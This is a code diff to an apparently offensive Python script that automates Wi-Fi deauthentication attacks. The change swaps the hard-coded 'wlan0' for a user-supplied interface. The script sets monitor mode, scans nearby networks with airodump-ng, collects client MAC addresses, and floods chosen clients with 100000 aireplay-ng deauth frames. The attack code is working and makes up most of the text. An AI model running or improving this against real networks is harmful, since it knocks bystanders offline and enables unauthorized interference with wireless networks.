@@ -9,7 +9,8 @@ import multiprocessing
 
 #This just to check if system arguments are correct!!
 user_arg = sys.argv[1]
-if(user_arg != "all" and user_arg != "select"):
+user_interface = sys.argv[2]
+if(user_arg != "all" and user_arg != "select" and (user_interface == None or user_interface == "" )):
     print("Wrong Arguments!\n")
     sys.exit()    
 
@@ -20,7 +21,7 @@ print("Working on some PreRequisites...\n")
 
 ####Premethods####
 #Turning wifi mode from managed to monitor
-subp.run(['bash','./Requires/premethods.sh'], capture_output=True)
+subp.run(['bash','./Requires/premethods.sh',user_interface], capture_output=True)
 
 print("Getting Network Ready...\nScanning...\n")
 
@@ -29,7 +30,7 @@ time.sleep(3)
 
 ####Catching All nearby Newtworks####
 try:
-    subp.run(['airodump-ng','--write','./Requires/test','wlan0'], timeout=12)
+    subp.run(['airodump-ng','--write','./Requires/test',user_interface], timeout=12)
 except Exception as e:
     pass
 
@@ -86,7 +87,7 @@ except Exception as e:
 
 
 ####Parsing and getting data of Devices(Mac-Address)####
-subp.run(['python3','./Requires/parse2.py'],capture_output=True)
+subp.run(['python3','./Requires/parse2.py',user_interface],capture_output=True)
 with open('./Requires/network2.csv','r') as f1: 
     cr = csv.reader(f1)
     final = []
@@ -129,7 +130,7 @@ else:
 
 ####DEauth function####
 def deauthim(mac):
-    subp.run(['aireplay-ng' ,'--deauth' ,'100000' ,'-a' ,target_net_info[0].strip()  ,'-c' ,mac ,'wlan0'],capture_output=True)
+    subp.run(['aireplay-ng' ,'--deauth' ,'100000' ,'-a' ,target_net_info[0].strip()  ,'-c' ,mac ,user_interface],capture_output=True)
 
 ####Deauthenticating####
 deauthid = []
